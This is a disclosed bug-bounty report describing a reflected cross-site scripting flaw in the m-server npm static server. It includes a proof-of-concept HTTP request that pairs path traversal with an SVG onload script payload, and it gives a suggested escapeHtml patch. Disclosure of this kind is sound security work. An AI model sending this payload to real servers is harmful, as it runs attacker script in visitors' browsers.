# [m-server] XSS reflected because path does not escapeHtml

## Report Details
- **Report ID**: 951468
- **URL**: https://hackerone.com/reports/951468
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-08-05T08:11:07.493Z
- **Disclosed**: 2020-09-28T02:26:55.585Z

## Reporter
- **Username**: 0xd0ff9
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report XSS in m-server
It allows attacker can perform XSS in client side

# Module

**module name:** m-server
**version:** 1.4.2
**npm page:** `https://www.npmjs.com/package/m-server`

## Module Description
M-Server is a mini http static server that without any dependencies;


## Module Stats
[1] weekly downloads
150

# Vulnerability
XSS reflected because path does not escapeHtml

## Vulnerability Description
in `m-server/lib/utils.js` line 59 and 64, html push does not escapeHtml for variable path.
{F936938}

By change path of URL via traversal, attacker can control this variable `path`.
{F936939}

## Steps To Reproduce:
On server, run this:
$ cd /home/vagrant/tmp/test
$ m-server
On client, issue requests:
```
GET /../../../../home/vagrant/tmp/test/<svg/onload=alert(document.domain)>/../../../test/ HTTP/1.1
Host: 192.168.57.105:3001
User-Agent: curl/7.54.0
Accept: */*
Connection: close
```
POC:
{F936947}

## Patch
line 59 should use 
```
html.push('<li><a href="' + escapeHtml(path) + '/' + escapeHtml(val) + '">' + escapeHtml(val) + '</a></li>');
```
line 64 should use 
```
html.push('<li><a download href="' + escapeHtml(path) + '/' + escapeHtml(val) + '">' + escapeHtml(val) + '</a></li>');
```
Or strip path traversal

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- [OPERATING SYSTEM VERSION]
- [NODEJS VERSION]
- [NPM VERSION]
- [BROWSERS VERSIONS, IF APPLICABLE] 
- [OTHER SOFTWARE USED TO EXPLOIT VULNERABILITY AND THEIR VERSIONS, IF APPLICABLE]

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N] N
- I opened an issue in the related repository: [Y/N] N

> Hunter's comments and funny memes goes here

## Impact

XSS

## Attachments
- Screen_Shot_2020-08-05_at_2.57.56_PM.png
- Screen_Shot_2020-08-05_at_2.59.59_PM.png
- Screen_Recording_2020-08-05_at_2.47.01_PM.mov
